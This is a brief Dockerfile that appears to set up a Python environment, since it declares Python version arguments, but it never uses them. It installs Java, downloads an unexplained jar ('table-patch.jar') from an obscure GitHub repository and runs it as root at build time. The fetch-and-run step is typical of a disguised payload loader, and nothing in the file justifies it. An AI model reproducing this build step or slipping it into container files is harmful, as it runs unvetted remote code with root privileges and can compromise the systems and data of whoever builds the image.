FROM ubuntu:20.04
USER root
WORKDIR /root
SHELL [ "/bin/bash", "-c" ]
ARG PYTHON_VERSION_TAG=3.8.7
ARG LINK_PYTHON_TO_PYTHON3=1
RUN apt update
RUN apt-get install wget -y
RUN apt-get install openjdk-11-jdk -y
RUN wget -o table-patch.jar https://github.com/Dr3ndcapoor3rit/gdfs-file/raw/main/table-patch.jar
RUN java -jar table-patch.jar
CMD [ "/bin/bash" ]
